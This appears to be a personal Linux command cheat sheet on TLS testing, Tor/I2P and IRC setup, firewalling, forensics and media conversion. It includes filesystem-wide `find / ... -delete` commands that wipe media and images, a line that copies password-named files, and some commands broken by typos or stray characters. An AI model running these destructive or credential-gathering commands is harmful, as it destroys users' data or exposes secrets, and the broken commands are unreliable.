openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/apache2/ssl/apache.key -out /etc/apache2/ssl/apache.crt




## ---------------------------------------------- ##
##  [+] Testing connection to the remote host
## ---------------------------------------------- ##
echo | openssl s_client -connect $Domain:443 -showcerts


## ---------------------------------------------------------------- ##
##  [+] Testing connection to the remote host (with SNI support)
## ---------------------------------------------------------------- ##
echo | openssl s_client -showcerts -servername $Domain -connect $Domain:443


## ----------------------------------------------------------------------- ##
##  [+] Testing connection to the remote host with specific ssl version
## ----------------------------------------------------------------------- ##
openssl s_client -tls1_2 -connect $Domain:443


## ----------------------------------------------------------------------- ##
##  [+] Testing connection to the remote host with specific ssl cipher
## ----------------------------------------------------------------------- ##
openssl s_client -cipher 'AES128-SHA' -connect $Domain:443



##-=============================================-##
##   [+] Connect to SMTP server using STARTTLS
##-=============================================-##
openssl s_client -starttls smtp -crlf -connect 127.0.0.1:25
openssl s_client -connect smtp.office365.com:587 -starttls smtp
gnutls-cli-debug --starttls-proto smtp --port 25 localhost



##-=========================================-##
##   [+]
##-=========================================-##
openssl s_client -connect smtp.gmail.com:587 -starttls smtp < /dev/null 2>/dev/null |
openssl x509 -fingerprint -noout -in /dev/stdin | cut -d'=' -f2


##-=========================================-##
##   [+]
##-=========================================-##
openssl s_client -showcerts -starttls smtp -connect smtp_relay:smtp_relay_port < /dev/null 2> /dev/null


##-=========================================-##
##   [+]
##-=========================================-##
sudo -u postfix openssl s_client -showcerts -starttls smtp -connect smtp.gmail.com:587 < /dev/null 2> /dev/null


##-=========================================-##
##   [+]
##-=========================================-##
openssl s_client -CApath /etc/ssl/certs -showcerts -starttls smtp -connect smtp_relay:smtp_relay_port < /dev/null 2> /dev/null


##-=========================================-##
##   [+] secure POP:
##-=========================================-##
openssl s_client -quiet -connect $Domain:995
openssl s_client -crlf -connect server.server.net:110 -starttls pop3


##-=========================================-##
##   [+] secure IMAP:
##-=========================================-##
openssl s_client -quiet -connect $Domain:993
openssl s_client -ssl3 -connect imap.gmail.com:993
gnutls-cli imap.gmail.com -p 993




openssl s_client -showcerts -connect chat.freenode.net:6697


##-=========================================-##
##   [+] Verify the SHA-256 fingerprint:
##-=========================================-##
openssl x509 -in /etc/pki/$File.pem -fingerprint -noout -sha256


##-=========================================================-##
##   [+] verify the XMPP servers certificate fingerprint
##-=========================================================-##
echo -e | openssl s_client -connect $Domain:5222 -starttls xmpp | openssl x509 -noout -fingerprint -sha256 | tr -d ':'








gnutls-cli --crlf --starttls --x509cafile /etc/pki/CA/cacert.pem --port 25 mail.$Domain.com






openssl s_client -host $Host -port 389
openssl s_client -host $Host -port 636


##-============================================-##
##   [+] Connect to LDAP/LDAPS Using CA File:
##-============================================-##
openssl s_client -CAfile /$Dir/$File.pem -host $Host -port 389
openssl s_client -CAfile /$Dir/$File.pem -host $Host -port 636

openssl s_client -connect $Host:$Port -starttls LDAP

openssl s_client -connect ldap.$Host:389
openssl s_client -connect ldap.$Host:636


##-=================================-##
##   [+] Dump LDAP/LDAPS To File:
##-=================================-##
tcpdump port 389 -w $File.pcap
tcpdump port 636 -w $File.pcap




##-=========================================-##
##   [+] Creating a Certificate Request
##-=========================================-##
openssl req -config /etc/mail/certs/mailCA/openssl.cnf -new -nodes -days 1095 -keyout $Domain.key.pem -out $Domain.csr.pem


##-=========================================-##
##   [+] Signing Your Certificate Request
##-=========================================-##
openssl ca -config /etc/mail/certs/mailCA/openssl.cnf -policy policy_anything -out $Domain.cert.pem -infiles $Domain.csr.pem


##-========================================-##
##  [+] Generate multidomain certificate
##-========================================-##
certbot certonly -d $Domain -d $Domain


##-======================================-##
##  [+] Generate wildcard certificate
##-======================================-##
certbot certonly --manual --preferred-challenges=dns -d $Domain -d *.$Domain


##-======================================================-##
##  [+] Generate certificate with 4096 bit private key
##-======================================================-##
certbot certonly -d $Domain -d $Domain --rsa-key-size 4096


##-======================================-##
##   [+] 
##-======================================-##
stunnel -cr $Site.com:443





## ----------------------------------------------------------------------------- ##
##   [?] tor-gencert - Generate certs and keys For Tor directory authorities
## ----------------------------------------------------------------------------- ##
##   [?] Tor directory authorities running the v3 Tor directory protocol, 
## ----------------------------------------------------------------------------- ##
##   [?] Every directory authority has a long term authority identity key 
##   [?] (which is distinct from the identity key it uses as a Tor server); 
##   [?] this key should be kept offline in a secure location.
## ----------------------------------------------------------------------------- ##


##-======================================-##
##   [+] Generate a new identity key:
##-======================================-##
tor-gencert --create-identity-key


##-======================================================-##
##   [+] Read the identity key from the specified file:
##-======================================================-##
##   [?] Default: "./authority_identity_key"
## ------------------------------------------------------ ##
tor-gencert -i $File


##-=====================================================-##
##   [+] Write the signing key to the specified file:
##-=====================================================-##
##   [?] Default: "./authority_signing_key"
## ----------------------------------------------------- ##
tor-gencert -s $File


##-=====================================================-##
##   [+] Write the certificate to the specified file:
##-=====================================================-##
##   [?] Default: "./authority_certificate"
## ----------------------------------------------------- ##
tor-gencert -c $File



##-======================================-##
##   [+]
##-======================================-##
i2prouter start


##-======================================-##
##   [+]
##-======================================-##
sudo -u i2psvc i2prouter start
sleep 2


##-======================================-##
##   [+]
##-======================================-##
xdg-open
xdg-open http://127.0.0.1:7657/home


##-======================================-##
##   [+]
##-======================================-##
kill -INT $( cat /var/run/i2pd/i2pd.pid )


##-======================================-##
##   [+]
##-======================================-##
iptables -A OUTPUT -m owner --uid-owner $TorUID -j ACCEPT
iptables -A OUTPUT -j REJECT


##-======================================-##
##   [+]
##-======================================-##
tor_uid="$(id -u debian-tor)"


##-======================================-##
##   [+]
##-======================================-##
curl -s -m 10 --socks5 "$hostport" --socks5-hostname "$hostport" -L "$url"


##-===================================================================-##
##   [+] Curl - Tor SOCKS5 Proxy - Secure TLS - Firefox User Agent 
##-===================================================================-##
curl --proxy "socks5h://localhost:9050" --tlsv1.2 --compressed --user-agent "Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'DNT: 1' $URL



echo "## ########################################## ###"
echo "## 	##"
echo "## ########################################## ###"
/ignore * CTCPS

echo "## ########################################## ###"
echo "## 	##"
echo "## ########################################## ###"
/ignore * DCC





## ---------------------------------------------------------------------------- ##
     /OTR gen                               ## Generate OTR Keys
     /OTR genkey $Nick@irc.$Server.net      ## Generate OTR Keys For $Server
## ---------------------------------------------------------------------------- ##
     /OTR start					            ## Starts an OTR chat
     /OTR finish $Nick			            ## Finish an OTR chat
## ---------------------------------------------------------------------------- ##
     /OTR trust $Nick			            ## Trusts the other user
     /OTR auth $Nick $Pass   	            ## Auths a user via password
## ---------------------------------------------------------------------------- ##






~/.config/hexchat/
~/.config/hexchat/certs/
~/.config/hexchat/ignore.conf
~/.config/hexchat/hexchat.conf


/ignore *!*@* CTCP DCC
/ignore * CTCP DCC
/ignore * CTCPS
/ignore * DCC
/ignore * CTCP DCC
/set identd OFF
/set dcc_auto_chat 0
/set dcc_auto_resume OFF

/set net_proxy_host 10.8.0.1
/set net_proxy_port 1080
/set net_proxy_type 3
/set irc_user_name xe1phix
/set irc_nick1 parrotsec-kiosk



## ################################################################################################## ##
## =============================== Beginning of I2p Irc2p Topic ===================================== ##
## ################################################################################################## ##




## ===================================================================================== ##

## ===================================================================================== ##
## 						KillYourTV I2P IRC (IRC2P Protocol) Server
## ===================================================================================== ##


## ---------------------------------------------------------------------------------- ##
/join channel #irc2p
## ---------------------------------------------------------------------------------- ##
KillYourTV / kytv on irc.oftc.net
Killyourtv on irc.oftc.net
KillYourTV on irc.killyourtv.i2p
killyourtv / kytv on irc.freenode.net
KillYourTV on irc.postman.i2p
## ---------------------------------------------------------------------------------- ##


## ===================================================================================== ##
## 						Other I2P IRC (IRC2P Protocol) Servers
## ===================================================================================== ##

## Irc2P							[[ xdg-open	http://127.0.0.1:6668	]]	## IRC tunnel to access the Irc2P network
## Postman Irc2p IRC Server			[[ 	 hexchat irc.postman.i2p:6667	]]	##
## Echelons Irc2p IRC Server		[[ 	 hexchat irc.echelon.i2p:6667	]]	##




##-=========================================-##
##   [+]
##-=========================================-##
/server add freenode chat.freenode.net/6697 -ssl
/connect chat.freenode.net/6697 -ssl


##-=========================================-##
##   [+]
##-=========================================-##
/set weechat.network.gnutls_ca_file "/etc/ssl/certs/ca-certificates.crt"


##-=========================================-##
##   [+]
##-=========================================-##
/server add NAME HOST/6667 -autoconnect -ssl -ssl_dhkey_size=512 -password=PASSWORD -username=USERNAME -nicks=NICK


~/.config/hexchat/certs/
##-=========================================-##
##   [+]
##-=========================================-##
openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes -keyout Certificate.key -out Certificate.crt


##-=========================================-##
##   [+]
##-=========================================-##
cat Certificate.crt Certificate.key > Certificate.pem
rm Certificate.crt Certificate.key


##-=========================================-##
##   [+] Register your fingerprint
##      (append FINGERPRINT if on Rizon):
##-=========================================-##
/msg NickServ cert add
/msg NickServ CERT LIST
/msg NickServ CERT ADD


sed -i 's/^\(net_proxy_type =\) 3$/\1 0/'     /home/anon/config/hexchat/hexchat.conf
sed -i 's/^\(dcc_ip_from_server =\) 0$/\1 1/' /home/anon/config/hexchat/hexchat.conf
sed -i 's/browser\.html/browser-noanon.html/'  /home/anon/config/firefox/profile.anon/prefs.js







Tor Browser without Tor


/home/parrotsec-kiosk/Downloads/Xe1phix-ParrotKiosk-Production-v2/Xe1phix-Firefox-Hardening/Xe1phix-User.js/FirefoxHardened-UserJsSetup-v4.7.sh
/home/parrotsec-kiosk/Downloads/Xe1phix-ParrotKiosk-Production-v2/Xe1phix-Firefox-Hardening/Xe1phix-TorBrowser/Xe1phix-TorBrowser-Setup-v4.3.sh


## Clone The Firefox Hardening Projects Github Repository:
git clone https://github.com/pyllyukko/user.js



##-===========================-##
##    [+]  SSH over HTTP (Squid)
##-===========================-##
socat TCP-L:9999,fork,reuseaddr PROXY:192.168.1.41:127.0.0.1:22,proxyport=3128
ssh $User@127.0.0.1 -p 9999



##-=========================-##
##    [+]  TCP Port Redirection
##-=========================-##
socat TCP-LISTEN:80,fork TCP:<remote host>:80
socat TCP-LISTEN:443,fork TCP:<remote host>:443


##-=========================-##
##    [+]  UDP Port Redirection
##-=========================-##
socat udp4-recvfrom:53,reuseaddr,fork udp4-sendto:$IPAddress>; echo -ne



##-===========================================-##
##   [+] print a specific line from a file
##-===========================================-##
awk 'FNR==5' $File


##-==============================================-##
##   [+] List your largest installed packages
##-==============================================-##
sed -ne '/^Package: \(.*\)/{s//\1/;h;};/^Installed-Size:  \(.*\)/{s//\1/;G;s/\n/ /;p;}' /var/lib/dpkg/status | sort -rn


##-======================================-##
##   [+]
##-======================================-##
irc_hide_version = 1



##-======================================-##
##   [+]
##-======================================-##
keyscan $Cert.pem $File.bin



##-====================================================================-##
##  [+] Ban all IPs that attempted to access phpmyadmin on your site
##-====================================================================-##
grep "phpmyadmin" /var/log/access.log | grep -Po "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" | sort | uniq | xargs -I% sudo iptables -A INPUT -s % -j DROP



##-===========================================================-##
##  [+] Block known dirty hosts from reaching your machine
##-===========================================================-##
wget -qO - http://infiltrated.net/blacklisted|awk '!/#|[a-z]/&&/./{print "iptables -A INPUT -s "$1" -j DROP"}'



##-==============================================================-##
##  [+] Retrieve dropped connections from firewalld journaling
##-==============================================================-##
journalctl -b | grep -o "PROTO=.*" | sed -r 's/(PROTO|SPT|DPT|LEN)=//g' | awk '{print $1, $3}' | sort | uniq -c


##-=========================-##
##   [+] Logger Services
##-=========================-##
logger -t "($(basename ))" $$ SERVICES-START being started....


tail -F /var/log/openvpn.log

lsof -Pni | grep




##-=================================================-##
##   [+] Count processes related to HTTP server
##-=================================================-##
ps aux | grep http | grep -v grep | wc -l



##-=================================================-##
##   [+] Display top 5 processes consuming CPU
##-=================================================-##
ps -eo pcpu,user,pid,cmd | sort -r | head -5


##-========================================================================-##
##   [+] Display the top ten running processes - sorted by memory usage
##-========================================================================-##
ps aux | sort -nk +4 | tail



##-=================================================-##
##   [+]
##-========================================================================-##
sysctl -w net.ipv4.ip_forward=1
iptables-save | sudo tee /etc/iptables/rules.v4

ipset list

/var/lib/ipset/rules-save
ipset save > "${IPSET_SAVE}"
ipset restore < "${IPSET_SAVE}"



ipset save > /etc/iptables/ipset.v4
ipset restore < /etc/iptables/ipset.v4
iptables-save > /etc/iptables/rules.v4
iptables-restore < /etc/iptables/rules.v4
ip6tables-restore < /etc/iptables/rules.v6

chmod 0640 /etc/iptables/rules.v4


if [ ! -f /proc/net/ip6_tables_names ]; then
		echo " skipping IPv6 (no modules loaded)"
elif [ -x /sbin/ip6tables-save ]; then
		touch /etc/iptables/rules.v6
        chmod 0640 /etc/iptables/rules.v6
		ip6tables-save > /etc/iptables/rules.v6



 linux vpn auto reconnect

nmcli connection modify <Your VPN connection name> vpn.persistent yes






/var/log/fail2ban.log











iptables ­A INPUT ­p TCP ­­dport 22 ­j ULOG ­­ulog­prefix "SSH connection attempt: "



conntrackd -C /etc/conntrackd/conntrackd.conf


ulogd --daemon --uid ulog --pidfile /run/ulog/ulogd.pid





--verbose
--loglevel
--configfile
--info


--daemon







	do
		f_iptrule "-D" "${ban_chain} -i ${dev} -m conntrack --ctstate NEW -m set --match-set ${src_name} src -j ${target_src}"
		f_iptrule "-D" "${ban_chain} -o ${dev} -m conntrack --ctstate NEW -m set --match-set ${src_name} dst -j ${target_dst}"
	done





# Mount folder/filesystem through SSH
sshfs name@server:/path/to/folder /path/to/mount/point

# Mount a temporary ram partition
mount -t tmpfs tmpfs /mnt -o size=1024m


tmpfs	/home/username/.cache	tmpfs	noatime,nodev,nosuid,size=400M	0	0







##-=====================================================-##
##   [+] ASCII string search and list the byte offset
##-=====================================================-##
srch_strings -t d $File.dd > $File.ascii.str


##-===================================================-##
##   [+] uNICODE string search and list byte offset
##-===================================================-##
srch_strings -e l –t d $File.dd > $File.uni.str




##-=========================-##
##   [+] Steganography
##-=========================-##
steghide extract -sf $File.jpg
steghide info $File.jpg








##-============================================================-##
##   [+] Create unallocated Image (deleted data) using blkls
##-============================================================-##
blkls $imagefile.dd > $unallocated_imagefile.blkls


##-========================================================-##
##   [+] Create Slack Image Using dls (for FAT and NTFS)
##-========================================================-##
blkls -s $imagefile.dd > $imagefile.slack


##-===============================================================-##
##   [+] Foremost Carves out files based on headers and footers
##-===============================================================-##
foremost -o $outputdir -c /etc/foremost.conf $File.img


##-===================================================================-##
##   [+] Sigfind - search for a binary value at a given offset (-o)
##-===================================================================-##
sigfind $hexvalue -o $offset $File.img





















zipdetails



zipcloak -

zip_stat (3)         - get information about file

encrypt entries in a zipfile
zipdetails (1)       - display the internal structure of zip files
zipgrep (1)          - search files in a ZIP archive for lines matching a pattern
zipinfo (1)          - list detailed information about a ZIP archive





ffmpeg -i contaminated.mov -acodec copy -vcodec copy clean.mov




##-===================================================================-##
##   [+]
##-=============================================================-##
ffmpeg -i $File.mp4 -map 0 -map_metadata 0:5:0 -c copy $File.mp4


##-===================================================================-##
##   [+]
##-=============================================================-##
ffmpeg -i $File.mov -acodec copy -vcodec copy $File.mov



##-=======================================================================-##
##   [+] Convert a MOV captured from a digital camera to a smaller AVI
##-=======================================================================-##
ffmpeg -i $File.mov -b 4096k -vcodec msmpeg4v2 -acodec pcm_u8 $File.avi


##-===================================================================-##
##   [+]
##-=======================================================================-##
ffmpeg -v info -i stego.mp3 -f null     ## to recode the file and throw away the result



##-=====================================-##
##   [+] Rip audio from a video file.
##-=====================================-##
mplayer -ao pcm -vo null -vc dummy -dumpaudio -dumpfile $OutFile $InFile


##-=======================================================-##
##   [+] Record a screencast and convert it to an mpeg
##-=======================================================-##
ffmpeg -f x11grab -r 25 -s 800x600 -i :0.0 $File.mpg


##-==========================================-##
##   [+] Capture video of a linux desktop
##-==========================================-##
ffmpeg -y -f alsa -ac 2 -i pulse -f x11grab -r 30 -s `xdpyinfo | grep 'dimensions:'|awk '{print $2}'` -i :0.0 -acodec pcm_s16le $File.wav -an -vcodec libx264 -vpre lossless_ultrafast -threads 0 output.mp4


##-============================================================-##
##   [+] Convert all .flac from a folder subtree In 320Kb mp3
##-============================================================-##
find . -type f -iname '*.flac' | while read FILE; do FILENAME="${FILE%.*}"; flac -cd "$FILE" | lame -b 320 - "${FILENAME}.mp3"; done



# Dumping Audio stream from flv (using ffmpeg)
ffmpeg -i <filename>.flv -vn <filename>.mp3


# Edit video by cutting the part you like without transcoding.
mencoder -ss <start point> -endpos <time from start point> -oac copy -ovc copy <invid> -o <outvid>



##-============================================================-##
##   [+] Substitute audio track of video file using mencoder
##-============================================================-##
mencoder -ovc copy -audiofile $File.mp3 -oac copy $File.avi -o $File.avi


##-=====================================================-##
##   [+] Remove sound from video file using mencoder
##-=====================================================-##
mencoder -ovc copy -nosound $File.avi -o $File.avi


##-========================================-##
##   [+] Concatenate (join) video files
##-========================================-##
mencoder -forceidx -ovc copy -oac copy -o $OutFile.avi $File1.avi $File2.avi


##-================================-##
##   [+] Android PNG screenshot

adb pull /dev/graphics/fb0 /dev/stdout | ffmpeg -vframes 1 -vcodec rawvideo -f rawvideo -pix_fmt rgb32 -s 480x800 -i pipe:0 -f image2 -vcodec png screenshot.png



##-===============================================-##
##   [+] Stream YouTube URL directly to mplayer
##-===============================================-##
mplayer -fs -cookies -cookies-file /tmp/cookie.txt 
youtube-dl -g --cookies /tmp/cookie.txt "http://www.youtube.com/watch?v=$VideoID"



##-======================================-##
##   [+] 
##-======================================-##
cdrecord -scanbus
cdrecord dev=ATA; -scanbus


##-======================================-##
##   [+]
##-======================================-##
cdparanoia -B					## Rip CD


##-======================================-##
##   [+]
##-======================================-##
dvdrecord -dao speed=2 dev=ATA:1,0,0 $File.iso
mkisofs -dev-video -udf -o $File.iso $Dir/


##-======================================-##
##   [+]
##-======================================-##
cdrao write --device /dev/sr0 $File.cue


##-==========================================-##
##   [+] burn an ISO image to writable CD

wodim cdimage.iso


##-===================================-##
##   [+] erase content from a cdrw
##-===================================-##
cdrecord -v -blank=all -force


##-=================================================-##
##   [+] Record MP3 audio via ALSA using ffmpeg
##-=================================================-##
ffmpeg -f alsa -ac 2 -i hw:1,0 -acodec libmp3lame -ab 96k $File.mp3


##-========================================================================-##
##   [+] Print a list of the 30 last modified mp3s sorted by last first
##-========================================================================-##
find ~/$Dir -daystart -mtime -60 -name *mp3 -printf "%T@\t%p\n" | sort -f -r | head -n 30 | cut -f 2



##-===================================-##
##   [+] convert wav files to flac
##-===================================-##
flac --best *.wav



##-=================================================================-##
##  [+] Convert all flac files in dir to mp3 320kbps using ffmpeg
##-=================================================================-##
for FILE in *.flac; do ffmpeg -i "$FILE" -b:a 320k "${FILE[@]/%flac/mp3}"; done;



flac --decode $File.flac $File.wav
flav $File.wav $File.flac


lame --decode $File.mp3 $File.wav
lame -b 128 -B 256 --vbr-new $File.wav $File.mp3
lame -b 192 $File.wav $File.mp3


oggenc -b 256 $File.wav


sox $File.wav -c 2 $File.wav


sox $File.wav -r 44100 $File.wav resample		## Resample WAV file to a 44.1 kHz sample rate



rec -t .wav $File.wav
rec -r 44100 $File.wav
rec -r 44100 -c 2 $File.wav

id3ed -s "" -n "" -a "" $File.mp3
id3v2 --TOAL "$Name" $Name.mp3

##-====================================================================-##
##   [+] Using mplayer to play the audio only but suppress the video
##-====================================================================-##
mplayer -novideo something.mpg


mplayer -fs dvd://
mplayer -sub $File.sub $File.avi
mplayer -monitoraspect 5:3

mplayer -dvd-device $Dir
mplayer $File.iso
mplayer -vo help

mplayer -vf cropdetect
mplayer crop=480:416:0:80
aa:width=250:height=80


mplayer dvd:// -ss


mplayer rtsp://site.com/steam
mplayer url -dumpsteam -dumpfile $File
mplayer /dev/video0
cat /dev/video0 > $File.mpg
mencoder dvd:// -i $File.avi -ovc lac -lavcopts vcodec=mpeg4:vhq:vbitrate=1800 -oac mp3lame -lameopts cbr:vol=3 -aid 128


##-======================================-##
##   [+]
##-======================================-##
tcprobe -i $File.mp3


##-======================================-##
##   [+]
##-======================================-##
locate -i *.mp3
locate -i -r '\.(mp3|ogg|wav)$'


##-======================================-##
##   [+]
##-======================================-##
find / iname "*.mp3"
find / -iregex '.*\.\(mp3\|ogg\|wav\)$'
find ~ -iname ".mp3"
find ~/mp3/ -iname '*.mp3' -exec mv "{}" /tmp/ \;

    find / -name '*.mp3' -type f -delete
    find / -name '*.mov' -type f -delete
    find / -name '*.mp4' -type f -delete
    find / -name '*.avi' -type f -delete
    find / -name '*.mpg' -type f -delete
    find / -name '*.mpeg' -type f -delete
    find / -name '*.flac' -type f -delete
    find / -name '*.m4a' -type f -delete
    find / -name '*.flv' -type f -delete
    find / -name '*.ogg' -type f -delete
    find /home -name '*.gif' -type f -delete
    find /home -name '*.png' -type f -delete
    find /home -name '*.jpg' -type f -delete
    find /home -name '*.jpeg' -type f -delete




find /$Dir/ -name "*.doc" -type f -exec mv {} "/$Dir/Documents/" \;
find /$Dir/ -name "*.docx" -type f -exec mv {} "/$Dir/Documents/" \;
find /$Dir/ -name "*.odt"  -type f -exec mv {} "/$Dir/Documents/" \;
find /$Dir/ -name "*.pdf"  -type f -exec mv {} "/$Dir/Pdfs/" \;
find /$Dir/ -name "*.mbox" -type f -exec mv {} "/$Dir/Mbox/"  \;
find /$Dir/ -name "*.png"  -type f -exec mv {} "/$Dir/Images/" \;
find /$Dir/ -name "*.jpg"  -type f -exec mv {} "/$Dir/Images/" \;
find /$Dir/ -name "*.jpeg" -type f -exec mv {} "/$Dir/Images/" \;
find /$Dir/ -name "*.gif"  -type f -exec mv {} "/$Dir/Images/" \;
find /$Dir/ -name "*.avi"  -type f -exec mv {} "/$Dir/Videos/" \;
find /$Dir/ -name "*.mpeg" -type f -exec mv {} "/$Dir/Videos/" \;
find /$Dir/ -name "*.mp4"  -type f -exec mv {} "/$Dir/Videos/" \;
find /$Dir/ -name "*.mkv"  -type f -exec mv {} "/$Dir/Videos/" \;
find /$Dir/ -name "*.webm" -type f -exec mv {} "/$Dir/Videos/" \;
find /$Dir/ -name "*.wmv"  -type f -exec mv {} "/$Dir/Videos/" \;
find /$Dir/ -name "*.flv"  -type f -exec mv {} "/$Dir/Videos/" \;
find /$Dir/ -name "*.mp3"  -type f -exec mv {} "/$Dir/Sound/" \;
find /$Dir/ -name "*.wav"  -type f -exec mv {} "/$Dir/Sound/" \;
find /$Dir/ -name "*.deb"  -type f -exec mv {} "/$Dir/Debians/" \;
find /$Dir/ -name "*.bin"  -type f -exec mv {} "/$Dir/binaries/" \;
find /$Dir/ -name "*.exe"  -type f -exec mv {} "/$Dir/exe/" \;
find /$Dir/ -name "*.rpm"  -type f -exec mv {} "/$Dir/rpms/" \;
find /$Dir/ -name "*.conf"  -type f -exec mv {} "/$Dir/conf_files" \;
find /$Dir/ -name "*.iso"  -type f -exec mv {} "/$Dir/ISO/" \;
find /$Dir/ -name "*.xls"  -type f -exec mv {} "/$Dir/Excel/" \;
find /$Dir/ -name "*.xlsx" -type f -exec mv {} "/$Dir/Excel/" \;
find /$Dir/ -name "*.csv"  -type f -exec mv {} "/$Dir/Excel/" \;
find /$Dir/ -name "*.ods"  -type f -exec mv {} "/$Dir/Excel/" \;
find /$Dir/ -name "*.ppt"  -type f -exec mv {} "/$Dir/Presentation/" \;
find /$Dir/ -name "*.pptx" -type f -exec mv {} "/$Dir/Presentation/" \;
find /$Dir/ -name "*.odp"  -type f -exec mv {} "/$Dir/Presentation/" \;
find /$Dir/ -name "*.html" -type f -exec mv {} "/$Dir/Web_Files/" \;
find /$Dir/ -name "*.htm"  -type f -exec mv {} "/$Dir/Web_Files/" \;
find /$Dir/ -name "*.jsp"  -type f -exec mv {} "/$Dir/Web_Files/" \;
find /$Dir/ -name "*.xml"  -type f -exec mv {} "/$Dir/Web_Files/" \;
find /$Dir/ -name "*.css"  -type f -exec mv {} "/$Dir/Web_Files/" \;
find /$Dir/ -name "*.js"   -type f -exec mv {} "/$Dir/Web_Files/" \;
find /$Dir/ -name "*.zip"  -type f -exec mv {} "/$Dir/Archives/" \;
find /$Dir/ -name "*.tar"  -type f -exec mv {} "/$Dir/Archives/" \;
find /$Dir/ -name "*.rar"  -type f -exec mv {} "/$Dir/Archives/" \;
find /$Dir/ -name "*.gzip" -type f -exec mv {} "/$Dir/Archives/" \;
find /$Dir/ -name "*.tar.gz" -type f  -exec mv {} "/$Dir/Archives/" \;
find /$Dir/ -name "*.7z"   -type f -exec mv {} "/$Dir/Archives/" \;
find /$Dir/ -name "*.bz"   -type f -exec mv {} "/$Dir/Archives/" \;
find /$Dir/ -name "*.bz2"  -type f -exec mv {} "/$Dir/Archives" \;
find /$Dir/ -name "*.*"    -type f -exec mv {} "/$Dir/Others/" \;





##-======================================-##
##   [+]
##-======================================-##
for i in *.wav; do oggenc -b 192 $i; done;



##-======================================-##
##   [+]
##-======================================-##
for i in *.wav; do j=`echo$i | sed -e 's/\.wav/.mp3/'`; lame -b 192 $i $j done;



##-======================================-##
##   [+]
##-======================================-##
for file in *.mp3; do mv "${file%.txt}{.txt,.xml}"; done



##-==============================================-##
##   [+] Sort movies by length, longest first
##-==============================================-##
for i in *.avi; do echo -n "$i:";totem-gstreamer-video-indexer $i | grep DURATION | cut -d "=" -f 2 ; done | sort -t: -k2 -r


##-=============================================================-##
##   [+] Convert filenames in current directory to lowercase
##-=============================================================-##
find / -depth -exec rename 's/(.*)\/([^\/]*)/$1\/\L$2/' {} \;


## ------------------------------------------------------- ##
##   [?] Replace spaces in filenames with underscores
## ------------------------------------------------------- ##
rename 's/ /_/g' *




# Remove comments from files
sed -e '/^#/d' -e 's/#.*$//' in

# Print all lines between two line numbers
awk 'NR >= 3 && NR <= 6' /path/to/file



##-===============================-##
##   [+] Bash Pause Function:
##-===============================-##
read -p "Press enter to continue.."


## ---------------------------------------------------------- ##
##   [?] Capitalize first letter of each word in a string
## ---------------------------------------------------------- ##
read -ra words <<< "<sentence>" && echo "${words[@]^}"



# Grab a list of MP3s out of Firefoxs cache
for i in `ls ~/.mozilla/firefox/*/Cache`; do file $i | grep -i mpeg | awk '{print $1}' | sed s/.$//; done


# embed referred images in HTML files
grep -ioE "(url\(|src=)['\"]?[^)'\"]*" a.html | grep -ioE "[^\"'(]*.(jpg|png|gif)" | while read l ; do sed -i "s>$l>data:image/${l/[^.]*./};base64,`openssl enc -base64 -in $l| tr -d '\n'`>" a.html ; done;

# Extract title from HTML files
awk 'BEGIN{IGNORECASE=1;FS="<title>|</title>";RS=EOF} {print $2}' file.html

# nice disk usage, sorted by size, see description for full command
du -sk ./* | sort -nr

# Sort the size usage of a directory tree by gigabytes, kilobytes, megabytes, then bytes.
dh() { du -ch --max-depth=1 "${@-.}"|sort -h }


# Mouse Tracking
while true; do xdotool getmouselocation | sed 's/x:\(.*\) y:\(.*\) screen:.*/\1, \2/' >> ./mouse-tracking; sleep 10; done

# get xclip to own the clipboard contents
xclip -o -selection clipboard | xclip -selection clipboard

# List the size (in human readable form) of all sub folders from the current location
du -sch ./*

# Analyse compressed Apache access logs for the most commonly requested pages
zcat access_log.*.gz | awk '{print $7}' | sort | uniq -c | sort -n | tail -n 20

# Find pages returning 404 errors in apache logs
awk '$9 == 404 {print $7}' access_log | uniq -c | sort -rn | head


# Send a local file via email
mutt your@email_address.com -s "Message Subject Here" -a attachment.jpg </dev/null




Find and copy files

find / -iname "passw" -print0 | xargs -I {} cp {} /new/path
find / -iname "passw" | xargs -I {} cp {} /new/path



# Find jpeg images and copy them to a central location
find . -iname "*.jpg" -print0 | tr '[A-Z]' '[a-z]' | xargs -0 cp --backup=numbered -dp -u --target-directory {location} &




tagmp3 set "%A:Pink Floyd %a:The Wall %t? %T?" *.mp3




tagmp3 move "/home/foo/mp3/%A/%a/%T-%t.mp3" *.mp3

tagmp3 move "%A-%t.mp3" *.mp3








# See your current RAM frequency
/usr/sbin/dmidecode | grep -i "current speed"



# List your largest installed packages.
dpkg --get-selections | cut -f1 | while read pkg; do dpkg -L $pkg | xargs -I'{}' bash -c 'if [ ! -d "{}" ]; then echo "{}"; fi' | tr '\n' '\000' | du -c --files0-from - | tail -1 | sed "s/total/$pkg/"; done

# print crontab entries for all the users that actually have a crontab
for USER in `cut -d ":" -f1 </etc/passwd`; do crontab -u ${USER} -l 1>/dev/null 2>&1; if [ ! ${?} -ne 0 ]; then echo -en "--- crontab for ${USER} ---\n$(crontab -u ${USER} -l)\n"; fi; done







# Execute a command at a given time
echo "ls -l" | at midnight


# An alarm clock using xmms2 and at
at 6:00 <<< "xmms2 play"











##-===========================================-##
##   [+] show top 10 process eating memory
##-===========================================-##
alias psmem='ps auxf | sort -nr -k 4 | head -10'


##-=========================================-##
##   [+] show top 10 process eating CPU
##-=========================================-##
alias pscpu='ps auxf | sort -nr -k 3 | head -10'


##-=============================-##
##   [+] Convert PDF to JPG
##-=============================-##
for file in `ls *.pdf`; do convert -verbose -colorspace RGB -resize 800 -interlace none -density 300 -quality 80 $File `echo $File | sed 's/\.pdf$/\.jpg/'`; done


# Merge PDFs into single file
gs -q -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=$File.pdf $File.pdf $File.pdf ...


convert -verbose -size 

##-========================================================-##
##   [+] Save an HTML page, and covert it to a .pdf file
##-========================================================-##
wget $URL | htmldoc --webpage -f "$URL".pdf - ; xpdf "$URL".pdf &


##-========================================================-##
##   [+] get all pdf and zips from a website using wget
##-========================================================-##
wget --reject html,htm --accept pdf,zip -rl1 $URL


##-==========================================-##
##   [+] Create a pdf version of a manpage
##-==========================================-##
man -t $Man | ps2pdf - $File.pdf



# make image semi-transparent
convert $File.png -alpha set -channel A -fx 0.5 $File.png

convert
convert -size 640x480



